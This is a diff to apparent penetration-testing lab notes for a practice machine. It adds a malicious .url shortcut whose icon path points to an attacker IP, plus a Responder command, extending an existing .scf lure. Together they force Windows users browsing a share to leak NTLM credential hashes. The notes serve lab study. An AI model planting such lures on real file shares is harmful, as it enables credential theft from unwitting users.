@@ -58,6 +58,21 @@ nano public/file.scf
 [Shell]
 Command=2
 IconFile=\\X.X.X.X\folder\jenriquez
+
+InternetShortcut
+
+https://insert-script.blogspot.com/2018/08/leaking-environment-variables-in_20.html
+
+┌──(root💀kali)-[/OSCPv3/offsec_pg/Vault]
+└─# responder -v -I tun0                                                                                                                                                       
+
+┌──(root💀kali)-[/OSCPv3/offsec_pg/Vault/DocumentsShare]
+└─# cat internetShortcut.url
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=anything
+IconFile=\\192.168.49.102\%USERNAME%.ico
+IconIndex=1
 ```
 ```Shell
 # Permissions
